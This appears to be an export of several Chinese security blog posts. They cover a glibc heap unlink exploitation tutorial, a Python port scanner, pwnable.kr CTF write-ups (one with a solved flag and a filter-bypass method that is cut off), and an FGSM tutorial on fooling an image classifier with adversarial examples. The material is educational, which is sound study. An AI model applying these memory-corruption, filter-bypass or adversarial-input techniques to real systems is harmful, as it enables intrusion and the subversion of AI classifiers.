&lt;getopt.h&gt;#include &lt;sys/types.h&gt;#include &lt;time.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdbool.h&gt;#include &lt;sys/time.h&gt;#include &lt;sys/stat.h&gt;#define CH_ATIME 1#define CH_MTIME 2//定义创建文件时的模式，此处对用户，组，其他设置的权限都是可读可写。#define MODE_RW_UGO (S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH)//标志文件access time 和 modify time的改变情况static int change_times;// 如果有(-c)选项，并且不存在命令行中输入的文件名，则不创建 static bool no_create;//当设置新的access time 和 modify time的时候使用static struct timespec newtime[2];//mytouch命令核心的核心模块，用于创建或者更新文件的时间戳。int main(int argc, char **argv)&#123; int c; bool ok = true; //初始化 ok、change_times、no_create： change_times = 0; no_create = false; //从命令行中得到命令的选项，即以&#x27;-&#x27;开头的参数。目前只支持三种选型-a, -c, -m。 while ((c = getopt(argc, argv, &quot;acm&quot;)) != -1) &#123; switch (c) &#123; case &#x27;a&#x27;: change_times |= CH_ATIME; break; case &#x27;c&#x27;: no_create = true; break; case &#x27;m&#x27;: change_times |= CH_MTIME; break; default: printf(&quot;fault option!&quot;); &#125; &#125; if (change_times == 0) change_times = CH_ATIME | CH_MTIME; //当newtime[0]. newtime[0].tv_nsec = UTIME_NOW; newtime[1].tv_nsec = UTIME_NOW; //如果optind == argc，代表少输入文件名字。 if (optind == argc) &#123; printf(&quot;missing file operand\\n&quot;); &#125; //针对多个文件名字调用mytouch函数 for (; optind &lt; argc; ++optind) ok &amp;= mytouch(argv[optind]); exit(ok ? EXIT_SUCCESS : EXIT_FAILURE);&#125; 设计mytouch函数mytouch 主要实现创建文件和更改文件的两种之间的功能。创建文件代码如下： 对于 open 函数来说，file 是用户输入的文件名字。O_CREAT | O_WRONLY 代表该函数的选项是文件不存在则创建和只写打开。最后一个参数指定创建的文件是权限是所有用户可读可写。 1fd = open(file, O_CREAT | O_WRONLY, MODE_RW_UGO); 修改文件的时间戳使用如下代码： 对于 utimensat 函数来说，第一个参数 AT_FDCWD 指定创建文件的路径是当前工作目录。第二个参数 file 指定要修改的时间戳文件名。第三个参数 newtime 指定修改的具体时间值。最后一个参数默认为 0。 1utimensat(AT_FDCWD, file, newtime, 0) mytouch 函数具体的函数逻辑如下： 该函数首先判断 no_create 是否为假，若为假，则创建文件。然后检测 change_times 的值，并根据其值做相关的处理。 mytouch 子函数代码如下： 123456789101112131415161718192021222324252627static boolmytouch(const char *file)&#123; bool ok; int fd = -1; if (!no_create) &#123; fd = open(file, O_CREAT | O_WRONLY, MODE_RW_UGO); &#125; //在主函数中，如果没有检测到（-a）（-m），则change_times == (CH_ATIME | CH_MTIME)，\\ 否则按照选项只用改变其中一个时间戳。 if (change_times != (CH_ATIME | CH_MTIME)) &#123; //只设定其中一个时间值。 if (change_times == CH_MTIME) //如果change_times == CH_MTIME，即（-m）,将对应的修改access time\\ 的timespec结构的tv_nsec设置为UTIME_OMIT;参考utimensat函数的用法 newtime[0].tv_nsec = UTIME_OMIT; else //如果change_times == CH_MTIME，即（-a）,将对应的修改modify time\\ 的timespec结构的tv_nsec设置为UTIME_OMIT;参考utimensat函数的用法 newtime[1].tv_nsec = UTIME_OMIT; &#125; //AT_FDCWD表示当前工作目录。 ok = (utimensat(AT_FDCWD, file, newtime, 0) == 0); return true;&#125; 测试函数功能输入以下命令编译并开始测试函数功能： 1gcc -o mytouch mytouch.c 测试不带选项的 mytouch 功能创建名字为 shiyanlou 的文件。并且查看该文件的状态，具体命令如下： 12./mytouch shiyanloustat shiyanlou 注意到最近访问、最近更改和最近改动的时间均是执行 ./mytouch shiyanlou 的时间。 测试 -a 选项 注意到最近访问、最近改动的时间均是执行 ./mytouch -a shiyanlou 的时间。 测试 -m 选项 注意到最近更改、最近改动的时间均是执行 ./mytouch -m shiyanlou 的时间。 测试 -c 选项","categories":[{"name":"C","slug":"C","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/C/"},{"name":"Linux","slug":"C/Linux","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/C/Linux/"},{"name":"touch","slug":"C/Linux/touch","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/C/Linux/touch/"}],"tags":[{"name":"C","slug":"C","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/C/"},{"name":"Linux","slug":"Linux","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/Linux/"}]},{"title":"unlink漏洞攻击","slug":"Heap/unlink漏洞攻击","date":"2020-10-24T11:01:21.000Z","updated":"2020-10-24T11:35:20.000Z","comments":true,"path":"2020/10/24/Heap/unlink漏洞攻击/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/24/Heap/unlink%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/","excerpt":"","text":"从一段代码开始123456789101112#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main(int argc, char *argv[])&#123; char *first, *second; first = malloc(666); second = malloc(12); if (argc != 1) strcpy(first, argv[1]); free(first); free(second); return 0;&#125; 上述程序在分配完堆后，堆内存分布如下图所示： 程序中 strcpy 函数会导致堆溢出，argv[1] 大于 666 字节时，可覆盖第二个 chunk 的各个字段为指定的值，从而使堆管理器将第二个 chunk 判断为空闲状态。根据 malloc 的内存回收机制，在 free(first) 时会将上图中的 second chunk 从 bin 中 unlink，并与第一个 chunk 合并。通过修改 second chunk 的 fd、bk 字段，unlink 时可把 free 函数的 GOT 表项写为 shellcode 地址。当程序再次调用 free 函数时会执行 shellcode。 什么是unlinkunlink攻击技术就是利用”glibc malloc”的内存回收机制，当堆块free时，会检查相邻的后面的堆块（地址更小的）或者前面的堆块（地址更大的）是否空闲，如果空闲，那么需要进行堆块合并操作。 空闲的堆块一般以双向链表的形式组织（fast bin是单向链表，此攻击不适用），如果刚刚释放的堆块要与前面或者后面空闲的堆块进行合并操作，那么需要将前或后的堆块从双向链表中摘下来，合并成更大的堆块插入到unsort bin链表中。空闲堆块从（small bin)双向链表中摘下来的操作就是unlink。 向后合并首先判断前一个 chunk 是否空闲，即检查当前 chunk 的 PREV_INUSE（P）位是否为 0。若为空闲，则将其合并。合并时，改变当前 chunk 指针指向前一个 chunk，使用 unlink 宏将前一个空闲 chunk 从 bin 中移除，最后更新合并后 chunk 的大小。 malloc.c 中向后合并的代码如下： 12345678910111213INTERNAL_SIZE_T hd = p-&gt;size; /* its head field */INTERNAL_SIZE_T sz; /* its size */INTERNAL_SIZE_T prevsz; /* size of previous contiguous chunk */sz = hd &amp; ~PREV_INUSE;/* consolidate backward */if (!(hd &amp; PREV_INUSE))&#123; prevsz = p-&gt;prev_size; p = chunk_at_offset(p, -(long)prevsz); sz += prevsz; unlink(p, bck, fwd);&#125;set_head(p, sz | PREV_INUSE); 本例中，释放 1st chunk 时，当前 chunk(1st chunk) 的前一个 chunk 是 allocated，所以不能向后合并，unlink 宏不会被调用。 向前合并首先判断下个 chunk 是否空闲，即检查下下个 chunk（相对当前 chunk）的 PREV_INUSE（P）位是否为 0，若为 0 表明下个 chunk 是空闲的，则进行合并。合并时使用 unlink 宏将下个 chunk 从它的 bin 中移除，并更新合并后的 chunk 大小。 malloc.c 中向前合并的代码如下： 123456789101112131415161718/* check/set/clear inuse bits in known places */#define inuse_bit_at_offset(p, s)\\ (((mchunkptr)(((char*)(p)) + (s)))-&gt;size &amp; PREV_INUSE)INTERNAL_SIZE_T hd = p-&gt;size; /* its head field */INTERNAL_SIZE_T sz; /* its size */sz = hd &amp; ~PREV_INUSE;next = chunk_at_offset(p, sz);nextsz = chunksize(next);/* consolidate forward */if (!(inuse_bit_at_offset(next, nextsz))) &#123; sz += nextsz; ... unlink(next, bck, fwd); next = chunk_at_offset(p, sz);&#125;set_head(p, sz | PREV_INUSE);next-&gt;prev_size = sz; 本例中，释放1st chunk 时，当前 chunk 的下一个 chunk（2nd chunk）是 allocated，所以不能向前合并，unlink 宏不会被调用。 unlink当前释放的堆与前一个或后一个空闲 chunk 进行合并时，会把空闲 chunk 从 bin 中移除，移除过程使用 unlink 宏来实现。unlink 宏的定义如下： 1234567/* Take a chunk off a bin list */#define unlink(P, BK, FD) &#123; \\ FD = P-&gt;fd; \\ BK = P-&gt;bk; \\ FD-&gt;bk = BK; \\ BK-&gt;fd = FD; \\&#125; unlink 即为将 P 从链表中删除的过程。 unlink攻击在 dlmalloc 中，unlink 的定义如上一节所示，只有与指针操作相关的 4 条语句。但在较新版本的 glibc 中，为了缓解攻击者进行 unlink 攻击，在宏定义中加入了安全校验，使得利用难度加大，只能在特定条件下使用一些技巧绕过校验。 原始的 unlink 攻击述例子中，传入的字符串参数长度大于 666 字节时 strcpy 会使 first chunk 溢出，可覆盖 second chunk 的头部字段为如下值： 1234prev_size = 偶数size = -4fd = free@got - 12bk = shellcode address 在执行 free(first) 时，当前释放的 frist chunk 的下下个 chunk 不是 top chunk。因为 second chunk 的大小覆盖为 -4，所以下下个 chunk 在 second chunk 偏移为 -4 的位置，因此 malloc 把 second chunk 的 prev_size 当做下下个 chunk 的 size。而 prev_size 已被覆盖为偶数（PREV_INUSE位为0），malloc 会将 second chunk 当作空闲 chunk。 释放 first chunk 时会将 second chunk 从 bin 中 unlink，并将其合并到 first chunk。这个过程会触发 unlink（second），此时 P = second chunk ptr，unlink 过程如下： 12341）FD = second chunk ptr-&gt;fd = free@got – 122）BK = second chunk ptr-&gt;bk = shellcode address3）FD-&gt;bk = BK，即 *((free@got–12)-&gt;bk) = shellcode address4）BK-&gt;fd = FD，即 *(shellcode address-&gt;fd) = free@got – 12 unlink 步骤 1）和 2）将 second chunk 的 fd 和 bk 复制到 FD 和 BK。如下图所示，复制后 FD = free@got-12，BK = shellcode address，即 second chunk 的 fd、bk 指针分别指向 free@got-12 和 shellcode address。 步骤 3）中 FD 是 malloc_chunk 结构体指针，FD-&gt;bk 相当于 FD+12 = free@got-12+12 = free@got，即 FD-&gt;bk 指向 free 的 GOT 表项，FD-&gt;bk = BK 相当于 free@got = shellcode address，即 free 的 GOT 表项被修改为了 shellcode 地址。因此，程序在执行第二个 free 时就会执行 shellcode。 同理，步骤4）中将 shellcode addr + 8 处 4 个字节覆盖为 free@got - 12，所以在编写 shellcode 时应跳过这 4 个字节。 对抗技术Double Free检测该机制不允许释放一个已经处于free状态的chunk。因此，当攻击者将second chunk的size设置为-4的时候，就意味着该size的PREV_INUSE位为0，也就是说second chunk之前的first chunk(我们需要free的chunk)已经处于free状态，那么这时候再free(first)的话，就会报出double free错误。相关代码如下： 1234567#!c/* Or whether the block is actually not marked used. */ if (__glibc_unlikely (!prev_inuse(nextchunk))) &#123; errstr = &quot;double free or corruption (!prev)&quot;; goto errout; &#125; next size非法检测该机制检测next size是否在8到当前arena的整个系统内存大小之间。因此当检测到next size为-4的时候，就会报出invalid next size错误。相关代码如下： 1234567#!cnextsize = chunksize(nextchunk);if (__builtin_expect (nextchunk-&gt;size &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (nextsize &gt;= av-&gt;system_mem, 0))&#123; errstr = &quot;free(): invalid next size (normal)&quot;; goto errout;&#125; 双链表冲突检测该机制会在执行unlink操作的时候检测链表中前一个chunk的fd与后一个chunk的bk是否都指向当前需要unlink的chunk。这样攻击者就无法替换second chunk的fd与fd了。相关代码如下： 123#!cif (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \\ malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P); \\ 但记住，即使由上述三种检测方式并不意味着unlink技术都会失效，攻防是一个此消彼长的过程，例如下面介绍一种绕过安全检验的方法（注意具体情况具体分析）。 绕过安全校验首先，需要了解 glibc 中 unlink 的校验机制。以下为 glibc-2.19 中 unlink 宏的部分代码，在删除 P 节点之前会检查 FD-&gt;bk != P || BK-&gt;fd != P 是否成立，即检查当前 chunk 前一个 chunk 的 bk 与后一个 chunk 的 fd 是否指向当前 chunk。若当前 chunk 的 fd 和 bk 被修改则无法通过这项检查，FD-&gt;bk = BK 与 BK-&gt;fd = FD 不会执行，导致 unlink 攻击不能进行。 123456789101112/* Take a chunk off a bin list */#define unlink(P, BK, FD) &#123; \\ FD = P-&gt;fd; \\ BK = P-&gt;bk; \\ if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \\ malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P); \\ else &#123; \\ FD-&gt;bk = BK; \\ BK-&gt;fd = FD; \\ ... &#125; \\&#125; 为了绕过以上指针校验，需要以下条件： a） 程序中存在一个全局指针变量 ptr b） ptr 指向的堆内存可由用户控制 若具备以上条件，攻击者可在指针 ptr 指向的内存中伪造一个空闲 chunk P，根据 ptr 构造合适的地址覆盖 chunk P 的 fd 和 bk，使得 FD-&gt;bk == P &amp;&amp; BK-&gt;fd == P 成立。具体如下： 12P-&gt;fd = ptr - 0xCP-&gt;bk = ptr - 0x8 在执行 unlink（P）时的指针操作如下： 1234561）FD = P-&gt;fd = ptr - 0xC;2）BK = P-&gt;bk = ptr - 0x8;// FD-&gt;bk = ptr - 0xC + 0xC = ptr; BK-&gt;fd = ptr -0x8 + 0x8 = ptr// 由于 ptr 指向 P,可成功绕过指针校验3）FD-&gt;bk = BK，即 *ptr = ptr - 0x8;4）BK-&gt;fd = FD，即 *ptr = ptr - 0xC。 由以上过程可知，借助指向 chunk P 的 ptr 指针可绕过 “corrupted double-linked list” 安全机制，并通过 unlink 攻击实现写内存，最终使得 ptr 指向 ptr - 0xc。 unlink 后，对 ptr 指向的内存进行写入，如 ‘A’*0xC + free@got，使得 ptr 指向 free@got，再次对 ptr 指向的内存进行写入，可以把 free@got 修改为 system 的地址，之后调用 free 可任意命令执行。","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Heap","slug":"PWN/Heap","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Heap/"},{"name":"Heap_Attack","slug":"PWN/Heap/Heap-Attack","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Heap/Heap-Attack/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"python实现端口扫描器","slug":"Python/python实现端口扫描器","date":"2020-10-24T00:19:51.000Z","updated":"2020-10-25T01:50:40.000Z","comments":true,"path":"2020/10/24/Python/python实现端口扫描器/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/24/Python/python%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/","excerpt":"","text":"实现原理最简单的端口扫描工具使用TCP连接扫描的方式，即利用操作系统原生的网络功能，且通常作为SYN扫描的替代选项。Nmap将这种模式称为连接扫描，因为使用了类似Unix系统的connect()命令。如果该端口是开放的，操作系统就能完成TCP三次握手，然后端口扫描工具会立即关闭刚建立的连接，防止拒绝服务攻击。这种端口扫描模式的优势是用户无需特殊权限。但使用操作系统原生网络功能不能实现底层控制，因此这种扫描方式并不流行。并且TCP扫描很容易被发现，尤其作为端口清扫的手段：这些服务会记录发送者的 IP 地址，入侵检测系统可能触发警报。$–&gt;$（端口扫描类型） 还有另外一种扫描方式是 SYN 扫描，端口扫描工具不使用操作系统原生网络功能，而是自行生成、发送 IP 数据包，并监控其回应。这种扫描模式被称为 “半开放扫描”，因为它从不建立完整的 TCP 连接。端口扫描工具生成一个 SYN 包，如果目标端口开放，则会返回 SYN-ACK 包。扫描端回应一个 RST 包，然后在握手完成前关闭连接。如果端口关闭了但未使用过滤，目标端口应该会持续返回 RST 包。这种粗略的网络利用方式有几个优点：给扫描工具全权控制数据包发送和等待回应时长的权力，允许更详细的回应分析。关于哪一种对目标主机的扫描方式更不具备入侵性存在一些争议，但 SYN 扫描的优势是从不会建立完整的连接。然而，RST 包可能导致网络堵塞，尤其是一些简单如打印机之类的网络设备。 实例中采用的是第一种扫描方式，直接利用操作系统的 socket 连接接口，初步测试目标服务器的端口是否可以连接，如果可以则返回端口打开状态。$–&gt;$（socket编程基础） 实现单线程扫描功能12345678910111213141516171819202122232425262728import sysfrom socket import *# 实现从程序外部向程序传递参数host = sys.argv[1]portstrs = sys.argv[2].split(&#x27;-&#x27;)# 扫描端口范围start_port = int(portstrs[0])end_port = int(portstrs[1])# 获取目标ip地址target_ip = gethostbyname(host)opened_ports = []# 进行循环连接for port in range(start_port, end_port): sock = socket(AF_INET, SOCK_STREAM) sock.settimeout(10) result = sock.connect_ex((target_ip, port)) if result == 0: opened_ports.append(port)# 打印开放的端口print(&quot;Opened ports:&quot;)for i in opened_ports: print(i) 上面代码实现了单线程扫描端口的测试，但是正常的程序在执行中我们需要考虑执行效率和提升性能，所以需要实现多线程程序。 多线程扫描123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475import timeimport socketfrom gevent import monkeymonkey.patch_all()import geventimport gevent.pooldef TCP_connect(ip, port): &quot;&quot;&quot;模拟TCP连接&quot;&quot;&quot; TCP_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) TCP_sock.settimeout(0.5) # 设置连接超时 try: result = TCP_sock.connect_ex((ip, int(port))) if result == 0: print(&quot;[*]%s 端口 开启\\t&quot; % port) else: # print(&quot;[!]%s端口 关闭&quot;%port) pass TCP_sock.close() except socket.error as e: print(&quot;[!]错误:&quot;, e)def scan_ip(): &quot;&quot;&quot;扫描目标IP&quot;&quot;&quot; ip = input(&quot;[+]输入扫描目标IP:&quot;) print(&quot;[*]正在扫描&quot;) scan_port(ip)def scan_web(): &quot;&quot;&quot;扫描目标网址&quot;&quot;&quot; web = input(&quot;[+]输入扫描网址:&quot;) if &quot;http://&quot; in web or &quot;https://&quot; in web: web = web[web.find(&#x27;://&#x27;) + 3:] print(web) print(&quot;[*]正在分析网站服务器IP&quot;) try: server_ip = socket.gethostbyname(str(web)) print(&quot;[*]服务器IP为%s&quot; % server_ip) scan_port(server_ip) except Exception as e: print(&quot;[!]服务器IP获取失败&quot;) passdef scan_port(ip): &quot;&quot;&quot;扫描端口&quot;&quot;&quot; print(&quot;[*]开始扫描目标端口&quot;) start = time.time() g = gevent.pool.Pool(50) # 设置线程数 run_list = [] for port in range(1, 65535): run_list.append(g.spawn(TCP_connect, ip, port)) gevent.joinall(run_list) end = time.time() print(&quot;[*]总耗时%s&quot; % time.strftime(&quot;%H:%M:%S&quot;, time.gmtime(end - start)))def main(): print(&quot;1.通过IP扫描端口&quot;) print(&quot;2.通过网址扫描端口&quot;) uc = int(input(&quot;[+]请输入选择:&quot;)) if 1 == uc: scan_ip() elif 2 == uc: scan_web() else: print(&quot;[!]输入有误&quot;)if __name__ == &quot;__main__&quot;: main() 这里展示部分运行结果： 选择通过网址扫描端口 选择通过IP扫描端口 使用nmap扫描12345678910import nmaphost = &#x27;192.168.56.1&#x27;# 把nmap.exe的路径放入PortScanner中，否则会有环境变量错误nm = nmap.PortScanner(nmap_search_path=(&#x27;nmap&#x27;, r&quot;E:\\nmap\\nmap.exe&quot;))for port in range(130, 136): result = nm.scan(host, str(port)) # 在主机192.168.56.1上获取端口22/tcp状态 state = result[&#x27;scan&#x27;][&#x27;192.168.56.1&#x27;][&#x27;tcp&#x27;][int(port)][&#x27;state&#x27;] print(&#x27;[%s] port state: %s&#x27; % (port, state)) 使用netstat -an查看本机开启的端口服务，用端口135测试代码运行的正确性 也可以直接使用zenmap工具进行端口扫描：","categories":[{"name":"Python","slug":"Python","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/Python/"},{"name":"Web","slug":"Python/Web","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/Python/Web/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/Python/"},{"name":"Nmap","slug":"Nmap","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/Nmap/"}]},{"title":"blukat","slug":"Pwnable_kr/blukat","date":"2020-10-22T14:01:47.000Z","updated":"2020-10-23T00:13:38.000Z","comments":true,"path":"2020/10/22/Pwnable_kr/blukat/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/22/Pwnable_kr/blukat/","excerpt":"","text":"查看blukat.c源文件123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;char flag[100];char password[100];char* key = &quot;3\\rG[S/%\\x1c\\x1d#0?\\rIS\\x0f\\x1c\\x1d\\x18;,4\\x1b\\x00\\x1bp;5\\x0b\\x1b\\x08\\x45+&quot;;void calc_flag(char* s)&#123; int i; for(i=0; i&lt;strlen(s); i++)&#123; flag[i] = s[i] ^ key[i]; &#125; printf(&quot;%s\\n&quot;, flag);&#125;int main()&#123; FILE* fp = fopen(&quot;/home/blukat/password&quot;, &quot;r&quot;); fgets(password, 100, fp); char buf[100]; printf(&quot;guess the password!\\n&quot;); fgets(buf, 128, stdin); if(!strcmp(password, buf))&#123; printf(&quot;congrats! here is your flag: &quot;); calc_flag(password); &#125; else&#123; printf(&quot;wrong guess!\\n&quot;); exit(0); &#125; return 0;&#125; 程序先读取password文件中的内容到password数组中，之后使用buf缓冲区读取用户输入的字符，buf缓冲区的大小为100，而读取的字符为128，之后比较用户输入的字符和password数组中的内容，如果相等，则可以执行cacl_flag函数，经过和密钥的异或运算计算出flag。如果采用缓冲区溢出覆盖fgets的返回地址为函数calc_flag的地址，由于不知道password的内容，无法正确计算出flag，因此这里缓冲区溢出攻击行不通。 PWN想到本题题干中的描述，本题应该是具有一种巧妙的解法（ls-la各项说明​）。 这里看到password文件的用户组含有blukat_pwn，而当前用户在blukat_pwn组，因此是具有读权限的，那运行cat命令： 提示没有访问权限？不，这里的文件内容就是这句话，那直接将这句话输入到可执行文件中即可拿到flag。","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"阅读深度学习的对抗攻击方法综述及实例","slug":"AI安全/阅读深度学习的对抗攻击方法综述及实例","date":"2020-10-22T07:24:07.000Z","updated":"2020-10-24T02:40:26.000Z","comments":true,"path":"2020/10/22/AI安全/阅读深度学习的对抗攻击方法综述及实例/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/","excerpt":"","text":"对抗样本攻击大体原理如下： 什么是对抗性例子？对抗性示例是专门创建的输入，其目的是混淆神经网络，从而导致给定输入的分类错误。这些臭名昭著的输入对于人眼是无法区分的，但是会导致网络无法识别图像的内容。这类攻击有几种类型，但是，这里的重点是快速梯度符号方法攻击，这是一种白盒攻击，其目的是确保错误分类。白盒攻击是攻击者可以完全访问被攻击模型的地方。举下面两个例子： 原始图像（左图），对抗噪声（中图），扰动后的图片即对抗样本（右图）被错误地分类为数字 2。 在这里，从熊猫的图像开始，攻击者向原始图像添加了较小的扰动（失真），这导致模型以较高的置信度将该图像标记为长臂猿。下面说明添加这些扰动的过程。 快速梯度符号法(FGSM) 下面展示简单的利用FGSM原理实现的示例。 FGSM的工作原理是利用神经网络的梯度来创建一个Adversarial example。对于输入图像，该方法使用相对于输入图像的损失的梯度来创建使损失函数最大化的新图像。这个新图像被称为对抗图像。 在这里，梯度是相对于输入的图像的。这样做是因为其目标是创造一个最大化损失的图像。实现这一点的方法是找出图像中每个像素对损失值的贡献程度，并相应地添加一个扰动（使用链式规则去计算梯度可以很容易地找到每个输入像素的贡献程度）。此外，由于模型不再被训练（因此梯度不针对可训练变量，即模型参数），因此模型参数保持不变。唯一的目的就是使一个已经受过训练的模型发生错误的分类。在这篇文章中，模型是MobileNetV2模型，在ImageNet上进行了预训练。 导入所需要的库123import tensorflow as tfimport matplotlib as mplimport matplotlib.pyplot as plt 设置图片相关信息1234# 图片像素mpl.rcParams[&#x27;figure.figsize&#x27;] = (8, 8)# 图片网格mpl.rcParams[&#x27;axes.grid&#x27;] = False 载入MobileNetV2模型12pretrained_model = tf.keras.applications.MobileNetV2(include_top=True, weights=&#x27;imagenet&#x27;)pretrained_model.trainable = False 图像预处理1234567891011121314def preprocess(image): image = tf.cast(image, tf.float32) image = image/255 image = tf.image.resize(image, (224, 224)) image = image[None, ...] return image# 获取图片信息image_path = tf.keras.utils.get_file(&#x27;YellowLabradorLooking_new.jpg&#x27;,&#x27;https://storage.googleapis.com/download.tensorflow.org/example_images/YellowLabradorLooking_new.jpg&#x27;)image_raw = tf.io.read_file(image_path)image = tf.image.decode_image(image_raw)image = preprocess(image) 将图像输入模型并得到概率最高的分类结果12345# Helper function to extract labels from probability vectordef get_imagenet_label(probs): return tf.keras.applications.mobilenet_v2.decode_predictions(probs, top=1)[0][0]image_probs = pretrained_model.predict(image) 展示图像12345plt.figure()plt.imshow(image[0])_, image_class, class_confidence = get_imagenet_label(image_probs)plt.title(&#x27;&#123;&#125; : &#123;:.2f&#125;% Confidence&#x27;.format(image_class, class_confidence*100))plt.show() 可以准确地预测出图像为拉布拉多犬（可能性最高为37.16%） 计算梯度12345678910111213loss_object = tf.keras.losses.CategoricalCrossentropy()def create_adversarial_pattern(input_image, input_label): with tf.GradientTape() as tape: tape.watch(input_image) prediction = pretrained_model(input_image) loss = loss_object(input_label, prediction) # Get the gradients of the loss w.r.t to the input image. gradient = tape.gradient(loss, input_image) # Get the sign of the gradients to create the perturbation signed_grad = tf.sign(gradient) return signed_grad 打印添加的噪音图像1234567# Get the input label of the image.labrador_retriever_index = 208label = tf.one_hot(labrador_retriever_index, image_probs.shape[-1])label = tf.reshape(label, (1, image_probs.shape[-1]))perturbations = create_adversarial_pattern(image, label)plt.imshow(perturbations[0]) 定义显示图像的函数1234567def display_images(image, description): _, label, confidence = get_imagenet_label(pretrained_model.predict(image)) plt.figure() plt.imshow(image[0]) plt.title(&#x27;&#123;&#125; \\n &#123;&#125; : &#123;:.2f&#125;% Confidence&#x27;.format(description, label, confidence*100)) plt.show() 加入噪声后再将图像输入模型进行判断12345678epsilons = [0, 0.01, 0.1, 0.15]descriptions = [(&#x27;Epsilon = &#123;:0.3f&#125;&#x27;.format(eps) if eps else &#x27;Input&#x27;) for eps in epsilons]for i, eps in enumerate(epsilons): adv_x = image + eps*perturbations adv_x = tf.clip_by_value(adv_x, 0, 1) display_images(adv_x, descriptions[i]) 其中epsilons 表示噪声的干扰程度。 输入图片 噪声为0.01 识别为Ibizan柴犬 噪声为0.1 识别为浴巾 噪声为0.15 识别为脑珊瑚 噪声为0.20 识别为毛毯 可见，输入图片添加噪声之后已经不能正确分类。","categories":[{"name":"AI","slug":"AI","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/AI/"},{"name":"Adversarial sample","slug":"AI/Adversarial-sample","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/AI/Adversarial-sample/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/AI/"}]},{"title":"cmd2","slug":"Pwnable_kr/cmd2","date":"2020-10-20T06:07:54.000Z","updated":"2020-10-20T07:27:30.000Z","comments":true,"path":"2020/10/20/Pwnable_kr/cmd2/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/20/Pwnable_kr/cmd2/","excerpt":"","text":"这里登录的密码为cmd1解出的flag： 1mommy now I get what PATH environment is for :) 查看cmd2.c源代码12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#include &lt;string.h&gt;int filter(char* cmd)&#123; int r=0; r += strstr(cmd, &quot;=&quot;)!=0; r += strstr(cmd, &quot;PATH&quot;)!=0; r += strstr(cmd, &quot;export&quot;)!=0; r += strstr(cmd, &quot;/&quot;)!=0; r += strstr(cmd, &quot;`&quot;)!=0; r += strstr(cmd, &quot;flag&quot;)!=0; return r;&#125;extern char** environ;void delete_env()&#123; char** p; for(p=environ; *p; p++) memset(*p, 0, strlen(*p));&#125;int main(int argc, char* argv[], char** envp)&#123; delete_env(); putenv(&quot;PATH=/no_command_execution_until_you_become_a_hacker&quot;); if(filter(argv[1])) return 0; printf(&quot;%s\\n&quot;, argv[1]); system( argv[1] ); return 0;&#125; cmd2在cmd1的基础上，加强了过滤操作。这里$=、PATH、export、/、$`$、flag$都不可以用。 下面介绍一种方法： 思路分析创建linux软链接方法如下： 12ln -s [源文件或目录][目标文件或目录]# 这里如果当前文件夹下不存在该目标文件，会自动创建，软链接相当于windows的快捷方式 首先在/tmp目录下建立自己的目录xiaohong404(这个目录可以任意取名，但不能和已经存在的文件名重复），然后创建目录*/tmp/xiaohong404/c。那么，如果在/tmp/xiaohong404/c目录下执行pwd命令就可以得到这个路径字符”/tmp/xiaohong404/c“。然后在/tmp/exploit目录下构造cat的软链接ln -s /bin/cat cat，在/tmp/exploit/c下建立flag的软链接ln -s 